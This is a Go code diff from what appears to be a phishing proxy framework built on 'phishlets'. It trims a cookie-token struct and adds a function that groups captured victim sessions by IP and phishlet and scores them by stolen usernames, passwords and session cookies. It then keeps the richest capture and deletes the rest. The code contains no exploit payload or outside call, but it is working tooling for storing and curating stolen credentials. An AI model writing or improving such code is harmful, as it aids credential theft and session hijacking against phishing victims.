@@ -28,16 +28,10 @@ type Session struct {
 }
 
 type CookieToken struct {
-	Name           string `json:"name"`
-	Value          string `json:"value"`
-	Domain         string `json:"domain"`
-	Path           string `json:"path"`
-	HttpOnly       bool   `json:"httpOnly"`
-	Secure         bool   `json:"secure"`
-	SameSite       string `json:"sameSite"`       // "no_restriction", "lax", "strict", or ""
-	ExpirationDate int64  `json:"expirationDate"` // Unix timestamp, 0 for session cookies
-	HostOnly       bool   `json:"hostOnly"`       // true if domain was not explicitly set
-	Session        bool   `json:"session"`        // true if no expiration (session cookie)
+	Name     string
+	Value    string
+	Path     string
+	HttpOnly bool
 }
 
 func (d *Database) sessionsInit() {
@@ -255,4 +249,63 @@ func (d *Database) FindRecentSessionByIPPhishlet(ip, phishlet string, windowSeco
 		}
 	}
 	return bestMatch
+}
+
+// CleanDuplicateSessions removes duplicate sessions keeping only the best one
+// (most data captured) for each IP+phishlet combination
+func (d *Database) CleanDuplicateSessions() (int, error) {
+	sessions, err := d.sessionsList()
+	if err != nil {
+		return 0, err
+	}
+
+	// Group sessions by IP + Phishlet
+	groups := make(map[string][]*Session)
+	for _, s := range sessions {
+		key := s.RemoteAddr + ":" + s.Phishlet
+		groups[key] = append(groups[key], s)
+	}
+
+	deleted := 0
+	for _, group := range groups {
+		if len(group) <= 1 {
+			continue
+		}
+
+		// Find the best session (most data)
+		var best *Session
+		bestScore := -1 // Start at -1 so first session always wins
+		for _, s := range group {
+			score := 0
+			if s.Username != "" {
+				score += 10
+			}
+			if s.Password != "" {
+				score += 10
+			}
+			if len(s.CookieTokens) > 0 {
+				score += 20
+			}
+			if len(s.Custom) > 0 {
+				score += 5
+			}
+			// Prefer more recent sessions when scores are equal
+			// FIX: Check if best is nil before accessing best.UpdateTime
+			if score > bestScore || (score == bestScore && best != nil && s.UpdateTime > best.UpdateTime) {
+				bestScore = score
+				best = s
+			}
+		}
+
+		// Delete all except the best
+		for _, s := range group {
+			if s.Id != best.Id {
+				if err := d.sessionsDelete(s.Id); err == nil {
+					deleted++
+				}
+			}
+		}
+	}
+
+	return deleted, nil
 }
